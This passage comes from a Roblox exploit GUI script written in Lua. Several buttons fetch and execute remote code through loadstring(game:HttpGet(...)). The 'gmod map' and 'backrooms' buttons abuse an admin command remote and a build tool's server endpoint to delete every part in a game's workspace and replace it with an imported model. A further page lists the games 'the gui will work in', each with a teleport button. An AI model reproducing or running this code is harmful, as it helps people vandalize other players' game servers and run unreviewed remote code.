wowwww3.Position = UDim2.new(0, 0, 0.122368366, 0)
wowwww3.Size = UDim2.new(0, 87, 0, 35)
wowwww3.Parent = ScrollingFrame

local LocalScript42 = Instance.new("Folder")
LocalScript42.Name = "LocalScript"
LocalScript42.Parent = wowwww3
__S[#__S + 1] = function(...)
local script = LocalScript42
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/dtURc7H4/raw"))()
end)

end

local wowwww4 = Instance.new("TextButton")
wowwww4.Name = "wowwww"
wowwww4.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
wowwww4.Text = "gmod map"
wowwww4.TextColor3 = Color3.fromRGB(255, 255, 255)
wowwww4.TextSize = 16
wowwww4.TextWrapped = true
wowwww4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
wowwww4.BorderColor3 = Color3.fromRGB(0, 242, 255)
wowwww4.Position = UDim2.new(0, 0, 0.122368366, 0)
wowwww4.Size = UDim2.new(0, 87, 0, 35)
wowwww4.Parent = ScrollingFrame

local LocalScript43 = Instance.new("Folder")
LocalScript43.Name = "LocalScript"
LocalScript43.Parent = wowwww4
__S[#__S + 1] = function(...)
local script = LocalScript43
script.Parent.MouseButton1Click:Connect(function()
local function poopnoremove(id)
	-- fixed by 1sw0rd1
        -- edit by trafficconehax

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
		end
	end
	if tool == nil then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end
	remote = tool.SyncAPI.ServerEndpoint

	local model_id = id
	local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
	imported_model.Parent = game.Lighting
        
        local destination = workspace:FindFirstChildOfClass("Terrain")

        if tool ~= nil and tool:FindFirstChild("Tools") and tool:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
           destination = workspace
        end

	for _, v in next, imported_model:GetDescendants() do
		pcall(function()
			v.Anchored = true
		end)
	end

	local plr = game:GetService("Players").LocalPlayer

local totalparts = {}

total = 0
completed = 0

for i,v in pairs(imported_model:GetDescendants()) do
if v:IsA("Part") or v:IsA("WedgePart") or v:IsA("Seat") or v:IsA("VehicleSeat") or v:IsA("TrussPart") or v:IsA("SpawnLocation") or v:IsA("CornerWedgePart") then
total += 1
			local Type = v:IsA("WedgePart") and "Wedge" or v:IsA("Seat") and "Seat" or v:IsA("VehicleSeat") and "Vehicle Seat" or v:IsA("TrussPart") and "Truss" or v:IsA("SpawnLocation") and "Spawn" or v:IsA("CornerWedgePart") and "Corner" or
				v.Shape == Enum.PartType.Block and "Normal" or
				v.Shape == Enum.PartType.Ball and "Ball" or
				v.Shape == Enum.PartType.Cylinder and "Cylinder"

task.defer(function()
            local part = remote:InvokeServer("CreatePart",Type,v.CFrame,destination)
            table.insert(totalparts, {new=part,old=v})
completed += 1
end)
end
end

while completed < total do
	task.wait()
end

local yeah = {}
for i,data in pairs(totalparts) do
table.insert(yeah,{Part=data.new,CFrame=data.old.CFrame,Size=data.old.Size})
end
task.defer(function()
remote:InvokeServer("SyncResize",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
if data.old.CanCollide ~= true then
table.insert(yeah,{Part=data.new,CanCollide=data.old.CanCollide})
end
end
if #yeah > 0 then
task.defer(function()
remote:InvokeServer("SyncCollision",yeah)
end)
end

local yeah = {}
for i,data in pairs(totalparts) do
table.insert(yeah,{Part=data.new,Color=data.old.Color})
end
task.defer(function()
remote:InvokeServer("SyncColor",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
if data.old.Material ~= "Plastic" or data.old.Reflectance ~= 0 or data.old.Transparency ~= 0 then
table.insert(yeah,{Part=data.new,Material=data.old.Material,Transparency=data.old.Transparency,Reflectance=data.old.Reflectance})
end
end
if #yeah > 0 then
task.defer(function()
remote:InvokeServer("SyncMaterial",yeah)
end)
end

local yeah = {}
for i,data in pairs(totalparts) do
table.insert(yeah,{Part=data.new,Surfaces={Top=data.old.TopSurface,Front=data.old.FrontSurface,Bottom=data.old.BottomSurface,Right=data.old.RightSurface,Left=data.old.LeftSurface,Back=data.old.BackSurface}})
end
task.defer(function()
remote:InvokeServer("SyncSurface",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local mesh1 = data.old:FindFirstChildOfClass("SpecialMesh")
if mesh1 then
table.insert(yeah,{Part=data.new})
end
end
task.defer(function()
remote:InvokeServer("CreateMeshes",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local mesh1 = data.old:FindFirstChildOfClass("SpecialMesh")
if mesh1 then
table.insert(yeah,{Part=data.new,MeshId=mesh1.MeshId,TextureId=mesh1.TextureId,Scale=mesh1.Scale,MeshType=mesh1.MeshType,VertexColor=mesh1.VertexColor})
end
end
task.defer(function()
remote:InvokeServer("SyncMesh",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local mesh2 = data.old:FindFirstChildOfClass("CylinderMesh")
if mesh2 then
table.insert(yeah,{Part=data.new})
end
end
task.defer(function()
remote:InvokeServer("CreateMeshes",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light1 = data.old:FindFirstChildOfClass("SpotLight")
if light1 then
table.insert(yeah,{Part=data.new,LightType="SpotLight"})
end
end
task.defer(function()
remote:InvokeServer("CreateLights",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light1 = data.old:FindFirstChildOfClass("SpotLight")
if light1 then
table.insert(yeah,{Part=data.new,LightType="SpotLight",Color=light1.Color,Range=light1.Range,Face=light1.Face,Angle=light1.Angle,Shadows=light1.Shadows})
end
end
task.defer(function()
remote:InvokeServer("SyncLighting",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light2 = data.old:FindFirstChildOfClass("PointLight")
if light2 then
table.insert(yeah,{Part=data.new,LightType="PointLight"})
end
end
task.defer(function()
remote:InvokeServer("CreateLights",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light2 = data.old:FindFirstChildOfClass("PointLight")
if light2 then
table.insert(yeah,{Part=data.new,LightType="PointLight",Color=light2.Color,Range=light2.Range,Shadows=light2.Shadows})
end
end
task.defer(function()
remote:InvokeServer("SyncLighting",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light3 = data.old:FindFirstChildOfClass("SurfaceLight")
if light3 then
table.insert(yeah,{Part=data.new,LightType="SurfaceLight"})
end
end
task.defer(function()
remote:InvokeServer("CreateLights",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light3 = data.old:FindFirstChildOfClass("SurfaceLight")
if light3 then
table.insert(yeah,{Part=data.new,LightType="SurfaceLight",Color=light3.Color,Range=light3.Range,Face=light3.Face,Angle=light3.Angle,Shadows=light3.Shadows})
end
end
task.defer(function()
remote:InvokeServer("SyncLighting",yeah)
end)

local yeah = {}

for i,data in pairs(totalparts) do
task.defer(function()
				local texture = data.old:FindFirstChildOfClass("Texture")
				local decal = data.old:FindFirstChildOfClass("Decal")
				if texture then
					for i,v in pairs(data.old:GetChildren()) do
						if v.ClassName == "Texture" then
							remote:InvokeServer("CreateTextures", {{ Part = data.new, Face = v.Face, TextureType = "Texture" }})
							remote:InvokeServer("SyncTexture", {{ Part = data.new, Face = v.Face, TextureType = "Texture", StudsPerTileU = v.StudsPerTileU, StudsPerTileV = v.StudsPerTileV, Texture = v.Texture, Transparency = v.Transparency }})
						end
					end
				end
				if decal then
					for i,v in pairs(data.old:GetChildren()) do
						if v.ClassName == "Decal" then
							remote:InvokeServer("CreateTextures", {{ Part = data.new, Face = v.Face, TextureType = "Decal" }})
							remote:InvokeServer("SyncTexture", {{ Part = data.new, Face = v.Face, TextureType = "Decal", Texture = v.Texture, Transparency = v.Transparency }})
						end
					end
				end

                                local fire = data.old:FindFirstChildOfClass("Fire")
                                local sparkles = data.old:FindFirstChildOfClass("Sparkles")
				local smoke = data.old:FindFirstChildOfClass("Smoke")
				if fire and fire.Enabled == true then
					remote:InvokeServer("CreateDecorations", {{ Part = data.new, DecorationType = "Fire" }})
					remote:InvokeServer("SyncDecorate", {{ Part = data.new, DecorationType = "Fire", Color = fire.Color, SecondaryColor = fire.SecondaryColor, Size = fire.Size, Heat = fire.Heat }})
				end
				if sparkles and sparkles.Enabled == true then
					remote:InvokeServer("CreateDecorations",{{Part=created,DecorationType="Sparkles"}})
					remote:InvokeServer("SyncDecorate",{{Part=created,DecorationType="Sparkles",SparkleColor=sparkles.SparkleColor}})
				end
				if smoke and smoke.Enabled == true then
					remote:InvokeServer("CreateDecorations", {{ Part = data.new, DecorationType = "Smoke" }})
					remote:InvokeServer("SyncDecorate", {{ Part = data.new, DecorationType = "Smoke", Color = smoke.Color, Size = smoke.Size, RiseVelocity = smoke.RiseVelocity, Opacity = smoke.Opacity }})

				end
end)
end

	print("Finished build.")
	imported_model.Parent = nil
end

local function poop(id)
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";re")
	wait(0.1)
	RequestCommand:InvokeServer(";btools ;give me build")
	wait(1.5)

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
		end
	end
	if tool == nil then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end
	remote = tool.SyncAPI.ServerEndpoint

	remote:InvokeServer('Remove', {game.Players.LocalPlayer.Character});

	local function GetPartsFromSelection(Selection)
		local Parts = {}
		for _, Descendant in pairs(Selection:GetDescendants()) do
			if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and not game.Players:GetPlayerFromCharacter(Descendant.Parent) and not Descendant.Parent:IsA("Accessory") then
				Parts[#Parts + 1] = Descendant
			end
		end
		return Parts
	end

	local getfuckedlol = GetPartsFromSelection(workspace)
	local shitass = {}
	for _, Part in pairs(getfuckedlol) do
		table.insert(shitass, Part);
	end;
	remote:InvokeServer('Remove', shitass);

	wait(0.5)

	poopnoremove(id)
end
poop(11150800879)
end)

end

local wowwww5 = Instance.new("TextButton")
wowwww5.Name = "wowwww"
wowwww5.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
wowwww5.Text = "backrooms"
wowwww5.TextColor3 = Color3.fromRGB(255, 255, 255)
wowwww5.TextSize = 16
wowwww5.TextWrapped = true
wowwww5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
wowwww5.BorderColor3 = Color3.fromRGB(0, 242, 255)
wowwww5.Position = UDim2.new(0, 0, 0.122368366, 0)
wowwww5.Size = UDim2.new(0, 87, 0, 35)
wowwww5.Parent = ScrollingFrame

local LocalScript44 = Instance.new("Folder")
LocalScript44.Name = "LocalScript"
LocalScript44.Parent = wowwww5
__S[#__S + 1] = function(...)
local script = LocalScript44
script.Parent.MouseButton1Click:Connect(function()
local function poopnoremove(id)
	-- fixed by 1sw0rd1
        -- edit by trafficconehax

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
		end
	end
	if tool == nil then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end
	remote = tool.SyncAPI.ServerEndpoint

	local model_id = id
	local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
	imported_model.Parent = game.Lighting
        
        local destination = workspace:FindFirstChildOfClass("Terrain")

        if tool ~= nil and tool:FindFirstChild("Tools") and tool:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
           destination = workspace
        end

	for _, v in next, imported_model:GetDescendants() do
		pcall(function()
			v.Anchored = true
		end)
	end

	local plr = game:GetService("Players").LocalPlayer

local totalparts = {}

total = 0
completed = 0

for i,v in pairs(imported_model:GetDescendants()) do
if v:IsA("Part") or v:IsA("WedgePart") or v:IsA("Seat") or v:IsA("VehicleSeat") or v:IsA("TrussPart") or v:IsA("SpawnLocation") or v:IsA("CornerWedgePart") then
total += 1
			local Type = v:IsA("WedgePart") and "Wedge" or v:IsA("Seat") and "Seat" or v:IsA("VehicleSeat") and "Vehicle Seat" or v:IsA("TrussPart") and "Truss" or v:IsA("SpawnLocation") and "Spawn" or v:IsA("CornerWedgePart") and "Corner" or
				v.Shape == Enum.PartType.Block and "Normal" or
				v.Shape == Enum.PartType.Ball and "Ball" or
				v.Shape == Enum.PartType.Cylinder and "Cylinder"

task.defer(function()
            local part = remote:InvokeServer("CreatePart",Type,v.CFrame,destination)
            table.insert(totalparts, {new=part,old=v})
completed += 1
end)
end
end

while completed < total do
	task.wait()
end

local yeah = {}
for i,data in pairs(totalparts) do
table.insert(yeah,{Part=data.new,CFrame=data.old.CFrame,Size=data.old.Size})
end
task.defer(function()
remote:InvokeServer("SyncResize",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
if data.old.CanCollide ~= true then
table.insert(yeah,{Part=data.new,CanCollide=data.old.CanCollide})
end
end
if #yeah > 0 then
task.defer(function()
remote:InvokeServer("SyncCollision",yeah)
end)
end

local yeah = {}
for i,data in pairs(totalparts) do
table.insert(yeah,{Part=data.new,Color=data.old.Color})
end
task.defer(function()
remote:InvokeServer("SyncColor",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
if data.old.Material ~= "Plastic" or data.old.Reflectance ~= 0 or data.old.Transparency ~= 0 then
table.insert(yeah,{Part=data.new,Material=data.old.Material,Transparency=data.old.Transparency,Reflectance=data.old.Reflectance})
end
end
if #yeah > 0 then
task.defer(function()
remote:InvokeServer("SyncMaterial",yeah)
end)
end

local yeah = {}
for i,data in pairs(totalparts) do
table.insert(yeah,{Part=data.new,Surfaces={Top=data.old.TopSurface,Front=data.old.FrontSurface,Bottom=data.old.BottomSurface,Right=data.old.RightSurface,Left=data.old.LeftSurface,Back=data.old.BackSurface}})
end
task.defer(function()
remote:InvokeServer("SyncSurface",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local mesh1 = data.old:FindFirstChildOfClass("SpecialMesh")
if mesh1 then
table.insert(yeah,{Part=data.new})
end
end
task.defer(function()
remote:InvokeServer("CreateMeshes",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local mesh1 = data.old:FindFirstChildOfClass("SpecialMesh")
if mesh1 then
table.insert(yeah,{Part=data.new,MeshId=mesh1.MeshId,TextureId=mesh1.TextureId,Scale=mesh1.Scale,MeshType=mesh1.MeshType,VertexColor=mesh1.VertexColor})
end
end
task.defer(function()
remote:InvokeServer("SyncMesh",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local mesh2 = data.old:FindFirstChildOfClass("CylinderMesh")
if mesh2 then
table.insert(yeah,{Part=data.new})
end
end
task.defer(function()
remote:InvokeServer("CreateMeshes",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light1 = data.old:FindFirstChildOfClass("SpotLight")
if light1 then
table.insert(yeah,{Part=data.new,LightType="SpotLight"})
end
end
task.defer(function()
remote:InvokeServer("CreateLights",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light1 = data.old:FindFirstChildOfClass("SpotLight")
if light1 then
table.insert(yeah,{Part=data.new,LightType="SpotLight",Color=light1.Color,Range=light1.Range,Face=light1.Face,Angle=light1.Angle,Shadows=light1.Shadows})
end
end
task.defer(function()
remote:InvokeServer("SyncLighting",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light2 = data.old:FindFirstChildOfClass("PointLight")
if light2 then
table.insert(yeah,{Part=data.new,LightType="PointLight"})
end
end
task.defer(function()
remote:InvokeServer("CreateLights",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light2 = data.old:FindFirstChildOfClass("PointLight")
if light2 then
table.insert(yeah,{Part=data.new,LightType="PointLight",Color=light2.Color,Range=light2.Range,Shadows=light2.Shadows})
end
end
task.defer(function()
remote:InvokeServer("SyncLighting",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light3 = data.old:FindFirstChildOfClass("SurfaceLight")
if light3 then
table.insert(yeah,{Part=data.new,LightType="SurfaceLight"})
end
end
task.defer(function()
remote:InvokeServer("CreateLights",yeah)
end)

local yeah = {}
for i,data in pairs(totalparts) do
local light3 = data.old:FindFirstChildOfClass("SurfaceLight")
if light3 then
table.insert(yeah,{Part=data.new,LightType="SurfaceLight",Color=light3.Color,Range=light3.Range,Face=light3.Face,Angle=light3.Angle,Shadows=light3.Shadows})
end
end
task.defer(function()
remote:InvokeServer("SyncLighting",yeah)
end)

local yeah = {}

for i,data in pairs(totalparts) do
task.defer(function()
				local texture = data.old:FindFirstChildOfClass("Texture")
				local decal = data.old:FindFirstChildOfClass("Decal")
				if texture then
					for i,v in pairs(data.old:GetChildren()) do
						if v.ClassName == "Texture" then
							remote:InvokeServer("CreateTextures", {{ Part = data.new, Face = v.Face, TextureType = "Texture" }})
							remote:InvokeServer("SyncTexture", {{ Part = data.new, Face = v.Face, TextureType = "Texture", StudsPerTileU = v.StudsPerTileU, StudsPerTileV = v.StudsPerTileV, Texture = v.Texture, Transparency = v.Transparency }})
						end
					end
				end
				if decal then
					for i,v in pairs(data.old:GetChildren()) do
						if v.ClassName == "Decal" then
							remote:InvokeServer("CreateTextures", {{ Part = data.new, Face = v.Face, TextureType = "Decal" }})
							remote:InvokeServer("SyncTexture", {{ Part = data.new, Face = v.Face, TextureType = "Decal", Texture = v.Texture, Transparency = v.Transparency }})
						end
					end
				end

                                local fire = data.old:FindFirstChildOfClass("Fire")
                                local sparkles = data.old:FindFirstChildOfClass("Sparkles")
				local smoke = data.old:FindFirstChildOfClass("Smoke")
				if fire and fire.Enabled == true then
					remote:InvokeServer("CreateDecorations", {{ Part = data.new, DecorationType = "Fire" }})
					remote:InvokeServer("SyncDecorate", {{ Part = data.new, DecorationType = "Fire", Color = fire.Color, SecondaryColor = fire.SecondaryColor, Size = fire.Size, Heat = fire.Heat }})
				end
				if sparkles and sparkles.Enabled == true then
					remote:InvokeServer("CreateDecorations",{{Part=created,DecorationType="Sparkles"}})
					remote:InvokeServer("SyncDecorate",{{Part=created,DecorationType="Sparkles",SparkleColor=sparkles.SparkleColor}})
				end
				if smoke and smoke.Enabled == true then
					remote:InvokeServer("CreateDecorations", {{ Part = data.new, DecorationType = "Smoke" }})
					remote:InvokeServer("SyncDecorate", {{ Part = data.new, DecorationType = "Smoke", Color = smoke.Color, Size = smoke.Size, RiseVelocity = smoke.RiseVelocity, Opacity = smoke.Opacity }})

				end
end)
end

	print("Finished build.")
	imported_model.Parent = nil
end

local function poop(id)
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";re")
	wait(0.1)
	RequestCommand:InvokeServer(";btools ;give me build")
	wait(1.5)

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
		end
	end
	if tool == nil then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end
	remote = tool.SyncAPI.ServerEndpoint

	remote:InvokeServer('Remove', {game.Players.LocalPlayer.Character});

	local function GetPartsFromSelection(Selection)
		local Parts = {}
		for _, Descendant in pairs(Selection:GetDescendants()) do
			if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and not game.Players:GetPlayerFromCharacter(Descendant.Parent) and not Descendant.Parent:IsA("Accessory") then
				Parts[#Parts + 1] = Descendant
			end
		end
		return Parts
	end

	local getfuckedlol = GetPartsFromSelection(workspace)
	local shitass = {}
	for _, Part in pairs(getfuckedlol) do
		table.insert(shitass, Part);
	end;
	remote:InvokeServer('Remove', shitass);

	wait(0.5)

	poopnoremove(id)
end
poop(9964385474)
end)

end

local Page5 = Instance.new("Frame")
Page5.Name = "Page5"
Page5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Page5.BackgroundTransparency = 1
Page5.BorderColor3 = Color3.fromRGB(0, 0, 0)
Page5.BorderSizePixel = 0
Page5.Position = UDim2.new(0, 0, 0.0350877196, 0)
Page5.Size = UDim2.new(0, 542, 0, 385)
Page5.Visible = false
Page5.Parent = R[2]

local TextLabel = Instance.new("TextLabel")
TextLabel.Name = "TextLabel"
TextLabel.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextLabel.Text = "--- games ---"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 15
TextLabel.TextWrapped = true
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(-5.63054954e-08, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 542, 0, 25)
TextLabel.Parent = Page5

local Frame = Instance.new("Frame")
Frame.Name = "Frame"
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, 0.155844152, 0)
Frame.Size = UDim2.new(0, 259, 0, 205)
Frame.Parent = Page5

local TextButton38 = Instance.new("TextButton")
TextButton38.Name = "TextButton"
TextButton38.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton38.Text = "would you rather job tower"
TextButton38.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton38.TextScaled = true
TextButton38.TextSize = 14
TextButton38.TextWrapped = true
TextButton38.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton38.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton38.BorderSizePixel = 2
TextButton38.Position = UDim2.new(0.819301248, 0, 0.169811442, 0)
TextButton38.Size = UDim2.new(0, 77, 0, 37)
TextButton38.Parent = Frame

local LocalScript45 = Instance.new("Folder")
LocalScript45.Name = "LocalScript"
LocalScript45.Parent = TextButton38
__S[#__S + 1] = function(...)
local script = LocalScript45
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local TARGET_PLACE_ID = 115728759684004 

local player = Players.LocalPlayer
local button = script.Parent
local debounce = false

button.MouseButton1Click:Connect(function()
    if debounce then return end
    debounce = true
    
    local success, err = pcall(function()
        TeleportService:TeleportAsync(TARGET_PLACE_ID, {player})
    end)
    
    if not success then
        warn(tostring(err))
        debounce = false
    end
end)

end

local UIGridLayout2 = Instance.new("UIGridLayout")
UIGridLayout2.Name = "UIGridLayout"
UIGridLayout2.CellSize = UDim2.new(0, 85, 0, 36)
UIGridLayout2.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout2.Parent = Frame

local TextButton39 = Instance.new("TextButton")
TextButton39.Name = "TextButton"
TextButton39.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton39.Text = "boy or girl avatar tower"
TextButton39.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton39.TextScaled = true
TextButton39.TextSize = 14
TextButton39.TextWrapped = true
TextButton39.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton39.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton39.BorderSizePixel = 2
TextButton39.Position = UDim2.new(0.819301248, 0, 0.169811442, 0)
TextButton39.Size = UDim2.new(0, 77, 0, 37)
TextButton39.Parent = Frame

local LocalScript46 = Instance.new("Folder")
LocalScript46.Name = "LocalScript"
LocalScript46.Parent = TextButton39
__S[#__S + 1] = function(...)
local script = LocalScript46
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local TARGET_PLACE_ID = 99104245386612 

local player = Players.LocalPlayer
local button = script.Parent
local debounce = false

button.MouseButton1Click:Connect(function()
    if debounce then return end
    debounce = true
    
    local success, err = pcall(function()
        TeleportService:TeleportAsync(TARGET_PLACE_ID, {player})
    end)
    
    if not success then
        warn(tostring(err))
        debounce = false
    end
end)

end

local TextButton40 = Instance.new("TextButton")
TextButton40.Name = "TextButton"
TextButton40.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton40.Text = "unbelievable tower"
TextButton40.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton40.TextScaled = true
TextButton40.TextSize = 14
TextButton40.TextWrapped = true
TextButton40.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton40.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton40.BorderSizePixel = 2
TextButton40.Position = UDim2.new(0.819301248, 0, 0.169811442, 0)
TextButton40.Size = UDim2.new(0, 77, 0, 37)
TextButton40.Parent = Frame

local LocalScript47 = Instance.new("Folder")
LocalScript47.Name = "LocalScript"
LocalScript47.Parent = TextButton40
__S[#__S + 1] = function(...)
local script = LocalScript47
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local TARGET_PLACE_ID = 98477936275548 

local player = Players.LocalPlayer
local button = script.Parent
local debounce = false

button.MouseButton1Click:Connect(function()
    if debounce then return end
    debounce = true
    
    local success, err = pcall(function()
        TeleportService:TeleportAsync(TARGET_PLACE_ID, {player})
    end)
    
    if not success then
        warn(tostring(err))
        debounce = false
    end
end)

end

local TextButton41 = Instance.new("TextButton")
TextButton41.Name = "TextButton"
TextButton41.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton41.Text = "tower getting dark"
TextButton41.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton41.TextScaled = true
TextButton41.TextSize = 14
TextButton41.TextWrapped = true
TextButton41.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton41.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton41.BorderSizePixel = 2
TextButton41.Position = UDim2.new(0.819301248, 0, 0.169811442, 0)
TextButton41.Size = UDim2.new(0, 77, 0, 37)
TextButton41.Parent = Frame

local LocalScript48 = Instance.new("Folder")
LocalScript48.Name = "LocalScript"
LocalScript48.Parent = TextButton41
__S[#__S + 1] = function(...)
local script = LocalScript48
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local TARGET_PLACE_ID = 12408077923 

local player = Players.LocalPlayer
local button = script.Parent
local debounce = false

button.MouseButton1Click:Connect(function()
    if debounce then return end
    debounce = true
    
    local success, err = pcall(function()
        TeleportService:TeleportAsync(TARGET_PLACE_ID, {player})
    end)
    
    if not success then
        warn(tostring(err))
        debounce = false
    end
end)

end

local TextButton42 = Instance.new("TextButton")
TextButton42.Name = "TextButton"
TextButton42.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton42.Text = "aesthetic tower (music wont work)"
TextButton42.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton42.TextScaled = true
TextButton42.TextSize = 14
TextButton42.TextWrapped = true
TextButton42.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton42.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton42.BorderSizePixel = 2
TextButton42.Position = UDim2.new(0.819301248, 0, 0.169811442, 0)
TextButton42.Size = UDim2.new(0, 77, 0, 37)
TextButton42.Parent = Frame

local LocalScript49 = Instance.new("Folder")
LocalScript49.Name = "LocalScript"
LocalScript49.Parent = TextButton42
__S[#__S + 1] = function(...)
local script = LocalScript49
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local TARGET_PLACE_ID = 12345178509 

local player = Players.LocalPlayer
local button = script.Parent
local debounce = false

button.MouseButton1Click:Connect(function()
    if debounce then return end
    debounce = true
    
    local success, err = pcall(function()
        TeleportService:TeleportAsync(TARGET_PLACE_ID, {player})
    end)
    
    if not success then
        warn(tostring(err))
        debounce = false
    end
end)

end

local TextLabel2 = Instance.new("TextLabel")
TextLabel2.Name = "TextLabel"
TextLabel2.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextLabel2.Text = "these are games that the gui will work in."
TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2.TextScaled = true
TextLabel2.TextSize = 14
TextLabel2.TextWrapped = true
TextLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2.BackgroundTransparency = 1
TextLabel2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel2.BorderSizePixel = 0
TextLabel2.Position = UDim2.new(0.497963041, 0, 0.116883114, 0)
TextLabel2.Size = UDim2.new(0, 261, 0, 81)
TextLabel2.Parent = Page5

local TextLabel3 = Instance.new("TextLabel")
TextLabel3.Name = "TextLabel"
